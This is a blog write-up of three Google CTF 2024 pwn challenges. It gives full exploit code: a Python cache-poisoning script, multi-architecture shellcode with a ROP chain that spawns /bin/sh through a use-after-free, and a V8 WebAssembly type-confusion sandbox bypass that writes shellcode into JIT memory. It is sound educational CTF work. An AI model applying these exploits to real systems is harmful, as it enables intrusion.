---
来源: https://ptr-yudai.hatenablog.com/entry/2024/07/09/115940
类型: 博客writeup
获取日期: 2026-06-30
说明: ptr-yudai 2024年7月
---

、90日以上更新していないブログに表示しています。


I played this year's [Google](https://d.hatena.ne.jp/keyword/Google) CTF in kijitora.
Luckily I managed to solve some tasks so I'll dump my solutions here.

![](https://cdn-ak.f.st-hatena.com/images/fotolife/p/ptr-yudai/20240709/20240709115914.png)

# [Pwn 215pt] KNIFE

We're given an [x86-64](https://d.hatena.ne.jp/keyword/x86-64) ELF program.
It can convert message from and to some encodings: plain, hex, or ascii 85.

The program has 10 slot of caches.
Each cache has a SHA256 of the plaintext as a key, and 6 sub-caches as values.
The sub-cache has an encoding result of the plaintext.

i.e.

```
Awaiting command...
hex a85 41414242
Success. Result: 7}9PL
Awaiting command...
hex a85 41414242
Serving from cache. Result: 7}9PL
```

The flag is cached when the program starts.
However, since the cache is looked up by SHA256 [value](https://d.hatena.ne.jp/keyword/value) of our input, there's no way we can leak the flag.

The [vulnerability](https://d.hatena.ne.jp/keyword/vulnerability) lies in the sub-cache system.
Each cache can hold up to 6 sub-caches, but it can write data to the 7th slot when all of the 6 slots are in use.

![](https://cdn-ak.f.st-hatena.com/images/fotolife/p/ptr-yudai/20240709/20240709095109.png)

The cache is simply an array of the following structure.

![](https://cdn-ak.f.st-hatena.com/images/fotolife/p/ptr-yudai/20240709/20240709095344.png)

So, if it tries to use the 7th slot, we actually overwrite the SHA256 of the next cache.
Obviously, the goal is to overwrite the SHA256 of the cached flag so that we can read the encoded flag through the cache.

The problem is, however, we cannot simply use up the 6 slots because the program only supports 3 types of encodings.
In other words, we need either multiple different encoded texts that decodes to the same message, or a message that encodes to multiple different encoded texts.

Ascii 85 encodes data to an ascii text of the length in multiple of 5 bytes.
Each 4-byte block of the data is encoded to 5-byte text.

If the length of the last block is not a multiple of 4 bytes, padding is added to the data in the following way:

* 1 byte left: 0x010100??
* 2 bytes left: 0x0100????
* 3 bytes left: 0x00??????

If you carefully reverse engineer the decoding function of ascii 85, you'll notice that the decoding process does not terminate even after it encounters the padding.
It means that if we concatenate multiple ascii 85 texts, it successfully decodes to the two messages concatenated.

Using this feature, I could poison the SHA256 [value](https://d.hatena.ne.jp/keyword/value) of the cached flag.

```
import hashlib
from ptrlib import *

alphabet = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!#$%&()*+-;<=>?@^_`{|}~'

def a85(block: int):
    assert block <= 0x1_010100FF
    output  = alphabet[block % 0x55]
    block //= 0x55
    output += alphabet[block % 0x55]
    block //= 0x55
    output += alphabet[block % 0x55]
    block //= 0x55
    output += alphabet[block % 0x55]
    block //= 0x55
    output += alphabet[block % 0x55]
    return output

def command(fmt_from: str, fmt_to: str, data: str | bytes):
    cmd = f"{fmt_from} {fmt_to} {bytes2str(data)}"
    sock.sendlineafter("Awaiting command...\n", cmd)

#sock = Process("./chal")
sock = Socket("knife.2024.ctfcompetition.com 1337")

while True:
    key = os.urandom(16)
    if b'\x00' in key: continue
    target = hashlib.sha256(key).hexdigest()
    if target.startswith('a85'): break

logger.info("key: " + key.hex())
logger.info("target: " + target)

for i in range(8):
    command("plain", "plain", "A"*(i+1))

fixed = target[3:] + "0000"
a = fixed + a85(0x0_41414141) + a85(0x0_41414141) + a85(0x1_01010041)
b = fixed + a85(0x0_41414141) + a85(0x1_00414141) + a85(0x1_01004141)
c = fixed + a85(0x0_41414141) + a85(0x1_01004141) + a85(0x1_00414141)
d = fixed + a85(0x0_41414141) + a85(0x1_01010041) + a85(0x0_41414141)
e = fixed + a85(0x1_00414141) + a85(0x1_01004141) + a85(0x0_41414141)
f = fixed + a85(0x1_01004141) + a85(0x1_00414141) + a85(0x0_41414141)

command("a85", "plain", a)
command("a85", "plain", b)
command("a85", "plain", c)
command("a85", "plain", d)
command("a85", "plain", e)
command("a85", "plain", f)

command("plain", "plain", key)

sock.sh()
```

# [Pwn 320pt] UNICORNEL

Unicornel is an emulator using the [unicorn](https://d.hatena.ne.jp/keyword/unicorn) engine.
It has multiple threads that can emulate programs for different architectures at once.

Each thread creates distinct [unicorn](https://d.hatena.ne.jp/keyword/unicorn) context, but it can share memory mapping with other architecture using `create_shared` and `map_shared` system call.

![](https://cdn-ak.f.st-hatena.com/images/fotolife/p/ptr-yudai/20240709/20240709102334.png)

There are some other interesting system calls implemented.

`bookmark` system call can save the current [unicorn](https://d.hatena.ne.jp/keyword/unicorn) context and `unicorn_rewind` can restore the state.
`switch_arch` is more unique. It can change the architecture running the current code.

The [vulnerability](https://d.hatena.ne.jp/keyword/vulnerability) lies in the locking mechanism of shared mapping. (Thanks [@moratorium08](https://twitter.com/moratorium08) for pointing out the bug!)
Shared memory has a reference counter that increments when mapped, and decrements when unmapped.
When the counter becomes 1, the shared buffer is no longer necessary and freed.

You can see that `unmap` takes mutex when decrementing the counter.

![](https://cdn-ak.f.st-hatena.com/images/fotolife/p/ptr-yudai/20240709/20240709102926.png)

However, `unicornel_rewind` does not acquire lock at all.

![](https://cdn-ak.f.st-hatena.com/images/fotolife/p/ptr-yudai/20240709/20240709103106.png)

When two threads tries to call `mmap` and `rewind` at the same timing, the shared buffer can be freed and thus use-after-free can occur.

What can we overwrite once use-after-free occurs?

`switch_arch` creates a new [unicorn](https://d.hatena.ne.jp/keyword/unicorn) context, which allocates `uc_engine`.
`uc_engine` has a lot of function pointers and is a good target for use-after-free[\*1](#f-a6bb1433 "This was obvious for me since I made a similar pwn challenge to overwrite uc_engine in BlackHat MEA Finals").

The annoying part is that we have to write these 3 things in 3 different architectures.
This is because we cannot run programs of the same architecture at the same time due to the limit of this challenge. ([TBH](https://d.hatena.ne.jp/keyword/TBH) I hate this kind of meaningless restriction.)

Again, [@moratorium08](https://twitter.com/moratorium08) helped me to convert my shellcode into [MIPS](https://d.hatena.ne.jp/keyword/MIPS), so it was stress-free for me :)

ARM (data race)

```
_start:
  ldr x0, =0x80003000
  mov sp, x0

  mov x1, 0
  bl Resume

  bl Bookmark

Lp:
  mov x3, 0
  mov x2, 0x1000
  ldr x1, =0xdead0000
  bl MapShared
  cbnz x0, Lp
  ldr x0, [x1]
  cbnz x0, Ok
  bl Rewind

Ok: 
  mov x1, 111
  bl PrintInteger

a: b a

  bl Exit

// x1 = address
// --> returns 1 if mapped
IsMapped:
  mov x2, 1
  mov x0, 1
  svc #0
  cmp x0, #1
  cset x0, eq
  ret

Exit:
  mov x0, 0
  svc #0

// x1 = buffer
// x2 = size
// --> returns written length on success, -1 on error
Write:
  //stp x29, x30, [sp, #-16]!
  //mov x29, sp
  mov x0, 1
  svc #0
  //ldp x29, x30, [sp], #16
  ret

// x1 = value
// --> always returns 0
PrintInteger:
  mov x0, 2
  svc #0
  ret

// x1 = size (must be PAGE-aligned)
// --> returns handle
CreateShared:
  mov x0, 3
  svc #0
  ret

// x1 = address
// x2 = length
// x3 = handle
// --> returns uc_err from uc_mem_map_ptr
MapShared:
  mov x0, 4
  svc #0
  ret

// --> returns uc_err from uc_mem_unmap
UnmapShared:
  mov x0, 5
  svc #0
  ret

// --> returns uc_err from uc_context_alloc or uc_context_save
Bookmark:
  mov x0, 6
  svc #0
  ret

// --> -1 when not bookmarked, -2 when uc_context_restore failed, 0 on success
Rewind:
  mov x0, 7
  svc #0
  ret

// x1 = uc_arch
// x2 = uc_mode
// --> 0 on success
SwitchArch:
  mov x0, 8
  svc #0
  ret

// --> always returns 0
Pause:
  mov x0, 9
  svc #0
  ret

// x1 = pid
// --> returns 0 on success, -1 on failure
Resume:
  mov x0, 10
  svc #0
  ret
```

[MIPS](https://d.hatena.ne.jp/keyword/MIPS) (race)

```
_start: 
  li $sp , 0x80003000
  li $a0, 9
  syscall
  nop

lp:
  li $a1, 0x6000
  li $a0, 3
  syscall
  nop

  li $a3, 0
  li $a2, 0x6000
  li $a1, 0xdead000
  li $a0, 4
  syscall
  nop

  li $t1, 0xdead000
  lw $a1, 0($t1)
  bnez $a1, ok
  nop

  li $a0, 5
  syscall
  nop

  b lp
  nop

ok:
  li $a1, 222
  li $a0, 2
  syscall
  nop

  li $a3, 0x4100
  li $a2, 8
  li $a1, 4
  li $a0, 8
  syscall
  nop

  li $a0, 0
  syscall
  nop
```

[x86-64](https://d.hatena.ne.jp/keyword/x86-64) (UAF)

```
_start:
  mov rsp, 0x80003000

  mov r12, 0xdead008
  xor ecx, ecx
Search:
  cmp qword ptr [r12 + rcx], 0x39c5
  jz Break
  add ecx, 0x10
  jmp Search
Break:
  lea r15, [rcx + 8]
  mov r14, [r12 + r15 + 0x40]
  add ecx, 0x90
  mov rbp, [r12 + rcx]
  sub rbp, 0x76cca0

//  mov rdi, r15
//  call PrintInteger
//  mov rdi, rbp
  //  call PrintInteger

  // pop rdi; ret;
  lea rax, [rbp + 0x00e478fd]
  mov [r12 + r15 + 0x28], rax
  // shellcode page
  mov rax, r14
  and rax, 0xfffffffffffff000
  mov [r12 + r15 + 0x30], rax
  // pop rsi; ret;
  lea rax, [rbp + 0x00e44f6e]
  mov [r12 + r15 + 0x38], rax
  // 0x2000
  mov qword ptr [r12 + r15 + 0x40], 0x2000
  // pop rdx; ret;
  lea rax, [rbp + 0x0097d172]
  mov [r12 + r15 + 0x48], rax
  // 7
  mov qword ptr [r12 + r15 + 0x50], 7
  // mprotect
  lea rax, [rbp + 0x169430]
  mov qword ptr [r12 + r15 + 0x58], rax
  // shellcode
  lea rax, [r14 + 0x70]
  mov qword ptr [r12 + r15 + 0x60], rax

  mov rax, 0x073d8d48f631d231
  mov [r12+r15+112], rax
  mov rax, 0x0000003bb8000000
  mov [r12+r15+120], rax
  mov rax, 0x732f6e69622f050f
  mov [r12+r15+128], rax
  mov rax, 0x9090909090900068
  mov [r12+r15+136], rax

  // push rdi; pop rsp; test al, 0xff; add rsp, 0x28; ret;
  lea rax, [rbp + 0x00b9dd45]
  mov [r12 + r15 + 0xc8], rax

/*
  xor ecx, ecx
  mov rax, 0xdead0000
Lp:
  inc ecx
  add r15, 8
  add rax, 0x8
  cmp ecx, 0x23
  jz Lp
  mov [r12 + r15], rax
  mov rax, [r12 + r15]
  cmp ecx, 0x20
  jb Lp
*/

  call Exit

// rdi = address
// --> returns 1 if mapped
IsMapped:
  mov ecx, 1
  mov rbx, rdi
  mov eax, 1
  int3
  cmp eax, 1
  setz al
  movzx eax, al
  ret

Exit:
  mov eax, 0
  int3
  hlt

// rdi = buffer
// rsi = size
// --> returns written length on success, -1 on error
Write:
  mov rcx, rsi
  mov rbx, rdi
  mov eax, 1
  int3
  ret

// rdi = value
// --> always returns 0
PrintInteger:
  mov rbx, rdi
  mov eax, 2
  int3
  ret

// rdi = size (must be PAGE-aligned)
// --> returns handle
CreateShared:
  mov rbx, rdi
  mov eax, 3
  int3
  ret

// rdi = address
// rsi = length
// rdx = handle
// --> returns uc_err from uc_mem_map_ptr
MapShared:
  mov rcx, rsi
  mov rbx, rdi
  mov eax, 4
  int3
  ret

// --> returns uc_err from uc_mem_unmap
UnmapShared:
  mov eax, 5
  int3
  ret

// --> returns uc_err from uc_context_alloc or uc_context_save
Bookmark:
  mov eax, 6
  int3
  ret

// --> -1 when not bookmarked, -2 when uc_context_restore failed, 0 on success
Rewind:
  mov eax, 7
  int3
  ret

// rdi = uc_arch
// rsi = uc_mode
// --> 0 on success
SwitchArch:
  mov rcx, rsi
  mov rbx, rdi
  mov eax, 8
  int3
  ret

// --> always returns 0
Pause:
  mov eax, 9
  int3
  ret

// rdi = pid
// --> returns 0 on success, -1 on failure
Resume:
  mov rbx, rdi
  mov eax, 10
  int3
  ret
```

# [Pwn 320pt] HEAT

[Google](https://d.hatena.ne.jp/keyword/Google) CTF has a [chromium](https://d.hatena.ne.jp/keyword/chromium) challenge every year...

The version is set to right before a specific commit.

```
...
RUN git fetch && git switch -d 'f603d5769be54dcd24308ff9aec041486ea54f5b^'
...
```

[github.com](https://github.com/v8/v8/commit/f603d5769be54dcd24308ff9aec041486ea54f5b)

`--sandbox-testing` is enabled

```
...
subprocess.check_call(['/home/user/d8', '--sandbox-testing', f.name])
...
```

This flag allows us to read from and write to arbitrary addresses inside the ubercage.
So, our goal is to bypass the sandbox of v8.

The commit in problem is introducing mitigation to the WebAssembly.
Previously, a wasm instance had type information of a wasm function inside the cage.
The fix in the commit prevents type confusion caused by overwriting the type information.

I created the following 3 wasm functions:

1. `i32 func0(struct arg0, i64 arg1) { arg0.0 = arg1; return 0; }`
2. `i64 func1(struct arg0) { return arg0.0; }`
3. `i64 func2(i64 arg0, i64 arg1, ...) { return arg0; }`

If we change the type of `func0` to `(i64, i64) -> i32` by type confusion and call the function, `arg0` is interpreted as a reference to a struct.
This gives us [AAW](https://d.hatena.ne.jp/keyword/AAW) primitive.
Similarly, if we change the type of `func1` to `(i64) -> i64` and call it, we can get AAR primitive.

Finally, if we change the tpye of `func2` to `() -> i64` and call it, `func2` tries to [access](https://d.hatena.ne.jp/keyword/access) an argument that is actually not passed.
It accesses the argument out-of-bound and thus can leak some pointers outside the cage.

With these primitives, I could overwrite the [JIT](https://d.hatena.ne.jp/keyword/JIT)-ted memory with my shellcode.

```
/**
 * Exploit
 */
function pwn() {
    const builder = new WasmModuleBuilder();
    builder.exportMemoryAs("mem0", 0);
    let $mem0 = builder.addMemory(1, 1);

    let kSig_i_ll = makeSig([kWasmI64, kWasmI64], [kWasmI32]);
    let kSig_f_f = makeSig([kWasmFuncRef], [kWasmFuncRef]);
    let kSig_l_f = makeSig([kWasmFuncRef], [kWasmI64])
    let $struct = builder.addStruct([makeField(kWasmI64, true)]);

    let $sig_i_ll = builder.addType(kSig_i_ll);
    let $sig_l_l = builder.addType(kSig_l_l);
    let $sig_l_v = builder.addType(kSig_l_v);
    let $sig_aaw = builder.addType(makeSig([wasmRefType($struct), kWasmI64], []));
    let $sig_aar = builder.addType(makeSig([wasmRefType($struct)], [kWasmI64]));
    let $sig_leak = builder.addType(
        makeSig([kWasmI64, kWasmI64, kWasmI64, kWasmI64, kWasmI64, kWasmI64, kWasmI64, kWasmI64],
                [kWasmI64])
    );

    let $f0 = builder.addFunction("func0", $sig_aaw)
        .exportFunc()
        .addBody([
            kExprLocalGet, 0,
            kExprLocalGet, 1,
            kGCPrefix, kExprStructSet, $struct, 0,
        ]);

    let $f1 = builder.addFunction("func1", $sig_aar)
        .exportFunc()
        .addBody([
            kExprLocalGet, 0,
            kGCPrefix, kExprStructGet, $struct, 0,
        ]);

    let $f2 = builder.addFunction("func2", $sig_leak)
        .exportFunc()
        .addBody([
            kExprLocalGet, 0,
        ]);

    let $f = builder.addFunction("f", $sig_i_ll).exportFunc().addBody([
        kExprI32Const, 0,
    ]);
    let $g = builder.addFunction("g", $sig_l_l).exportFunc().addBody([
        kExprI64Const, 0,
    ]);
    let $h = builder.addFunction("h", $sig_l_v).exportFunc().addBody([
        kExprI64Const, 0,
    ]);

    let $t0 =
        builder.addTable(wasmRefType($sig_i_ll), 1, 1, [kExprRefFunc, $f.index]);
    builder.addExportOfKind("table0", kExternalTable, $t0.index);

    let $t1 =
        builder.addTable(wasmRefType($sig_l_l), 1, 1, [kExprRefFunc, $g.index]);
    builder.addExportOfKind("table1", kExternalTable, $t1.index);

    let $t2 =
        builder.addTable(wasmRefType($sig_l_v), 1, 1, [kExprRefFunc, $h.index]);
    builder.addExportOfKind("table2", kExternalTable, $t2.index);

    builder.addFunction("aaw", kSig_i_ll)
        .exportFunc()
        .addBody([
            kExprLocalGet, 1,
            kExprLocalGet, 0,  // func parameter
            kExprI32Const, 0,  // func index
            kExprCallIndirect, $sig_i_ll, 0 /* table num */,
        ])

    builder.addFunction("aar", kSig_l_l)
        .exportFunc()
        .addBody([
            kExprLocalGet, 0,  // func parameter
            kExprI32Const, 0,  // func index
            kExprCallIndirect, $sig_l_l, 1 /* table num */,
        ])

    builder.addFunction("leak", kSig_l_v)
        .exportFunc()
        .addBody([
            kExprI32Const, 0,  // func index
            kExprCallIndirect, $sig_l_v, 2 /* table num */,
        ])

    let instance = builder.instantiate();

    let func0 = instance.exports.func0;
    let func1 = instance.exports.func1;
    let func2 = instance.exports.func2;
    let table0 = instance.exports.table0;
    let table1 = instance.exports.table1;
    let table2 = instance.exports.table2;

    // Prepare corruption utilities.
    const kHeapObjectTag = 1;
    const kWasmTableObjectTypeOffset = 32;

    let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));

    function getPtr(obj) {
        return Sandbox.getAddressOf(obj) + kHeapObjectTag;
    }
    function getField(obj, offset) {
        return memory.getUint32(obj + offset - kHeapObjectTag, true);
    }
    function setField(obj, offset, value) {
        memory.setUint32(obj + offset - kHeapObjectTag, value, true);
    }

    // Corrupt the table's type to accept putting $func0 into it.
    const kRef = 9;
    const kSmiTagSize = 1;
    const kHeapTypeShift = 5;

    let t0 = getPtr(table0);
    let t1 = getPtr(table1);
    let t2 = getPtr(table2);

    let type0 = (($sig_aaw << kHeapTypeShift) | kRef) << kSmiTagSize;
    setField(t0, kWasmTableObjectTypeOffset, type0);
    table0.set(0, func0);

    let type1 = (($sig_aar << kHeapTypeShift) | kRef) << kSmiTagSize;
    setField(t1, kWasmTableObjectTypeOffset, type1);
    table1.set(0, func1);

    let type2 = (($sig_leak << kHeapTypeShift) | kRef) << kSmiTagSize;
    setField(t2, kWasmTableObjectTypeOffset, type2);
    table2.set(0, func2);

    let trusted_data_addr = instance.exports.leak() - 1n;
    console.log("[+] trusted data @ " + trusted_data_addr.hex());

    let addr_rwx = instance.exports.aar(trusted_data_addr + 0x30n - 7n);
    console.log("[+] wasm code @ " + addr_rwx.hex());
    
    instance.exports.aaw(addr_rwx + 41n, 0x263d8d4852d231n);
    instance.exports.aaw(addr_rwx + 49n, 0x1b3d8d48570000n);
    instance.exports.aaw(addr_rwx + 57n, 0xb3d8d48570000n);
    instance.exports.aaw(addr_rwx + 65n, 0x3bb8e68948570000n);
    instance.exports.aaw(addr_rwx + 73n, 0x69622f050f000000n);
    instance.exports.aaw(addr_rwx + 81n, 0x632d0068732f6en);
    instance.exports.aaw(addr_rwx + 89n, 0x616c662f20746163n);
    instance.exports.aaw(addr_rwx + 97n, 0x9090007478742e67n);
    instance.exports.aaw(addr_rwx - 7n, 0x2eebn);
    
    instance.exports.aaw(1n, 1n);
}

pwn();
```

[\*1](#fn-a6bb1433):This was obvious for me since I made a similar pwn challenge to overwrite uc\_engine in BlackHat MEA Finals


[« 
AlpacaHack Round 1 (Pwn)のWriteup](https://ptr-yudai.hatenablog.com/entry/2024/08/19/035647)

[MapnaCTF 2024 Writeup
 »](https://ptr-yudai.hatenablog.com/entry/2024/01/23/174849)